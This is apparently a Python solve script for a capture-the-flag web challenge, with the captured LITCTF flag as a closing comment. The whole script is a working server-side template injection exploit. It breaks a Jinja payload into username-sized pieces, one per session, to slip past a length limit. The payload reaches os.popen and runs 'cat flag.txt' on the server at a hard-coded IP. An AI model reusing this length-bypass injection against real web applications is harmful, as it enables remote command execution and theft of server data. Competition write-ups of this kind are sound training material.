import requests

url = "http://34.44.129.8:52043"
# 1["__class__"]["__mro__"][1]["__subclasses__"]()[564].__init__["__globals__"]["os"]["popen"]("cat flag.txt")["read"]()

names = [
    # .............., <- 14
    '{{1["__cla"+"',
    '"*0+"ss__"+"',
    '"*0]["__mro"+"',
    '"*0+"__"+"',
    '"*0][1]["__"+"',
    '"*0+"subcla"+"',
    '"*0+"sses__"+"',
    '"*0]()[(not "',
    '")+564+(not "',
    '")].__init__["',
    '"*0+"__glob"+"',
    '"*0+"als__"+"',
    '"*0]["os"]["',
    '"*0+"popen"]("',
    '"*0+"cat "+"',
    '"*0+"flag"+"',
    '"*0+".txt")["',
    '"*0+"read"+"',
    '"*0]()}}',
]

sessions = []

for name in names:
    assert len(name) <= 14
    s = requests.session()
    s.post(url + "/set_username", data={"username": name})
    sessions.append(s)

for s in sessions:
    s.post(url + "/send_message", data={"message": "1"})

resp = sessions[0].get(url)
print(resp.text)

# LITCTF{c4n7_y0u_b3l13v3_us3rn4m35_c0uld_b3_1000_ch4r5_10ng_b3f0r3??}
